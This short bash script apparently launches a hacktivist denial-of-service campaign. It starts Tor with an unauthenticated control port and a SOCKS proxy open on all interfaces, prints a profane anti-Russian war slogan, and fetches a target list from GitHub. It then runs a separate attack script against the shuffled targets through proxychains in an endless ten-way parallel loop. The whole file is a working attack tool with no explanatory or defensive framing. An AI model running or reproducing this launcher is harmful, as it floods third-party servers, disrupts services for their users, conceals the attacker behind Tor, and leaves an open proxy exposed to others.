#!/bin/bash

tor --RunAsDaemon 1 --CookieAuthentication 0 --HashedControlPassword "" --SocksPort 0.0.0.0:9050

echo "российский военній корабль, иди на хуй!"

wget https://github.com/imsamurai/ban/raw/master/data/ph.txt

while true; do cat "ph.txt" | shuf | xargs -r -P 10 -L1 -d '\n' proxychains -q ./run.sh; done;
